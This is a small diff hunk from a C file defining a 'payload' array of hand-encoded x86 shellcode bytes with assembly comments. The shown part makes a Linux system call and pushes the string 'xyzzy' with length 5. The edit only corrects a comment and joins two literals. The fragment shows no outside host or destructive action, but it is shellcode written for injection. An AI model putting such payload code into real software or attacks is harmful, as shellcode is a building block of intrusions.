@@ -37,8 +37,8 @@ unsigned char payload[] =
    "\x58"                   	//pop    %eax
    "\xcd\x80"                	//int    $0x80
    "\x89\xc3"               	//mov    %eax,%ebx
-   "\x68" "\x79\x7a\x7a\x79"	// push "xyyzz"
-   "\x6a" "\x78"
+   "\x68" "\x79\x7a\x7a\x79"	// push "xyzzy"
+   "\x6a\x78"
    "\x89\xe1"              	//mov    %esp,%ecx
    "\x6a\x05"               	//push   $0x5
    "\x5a"                   	//pop    %edx
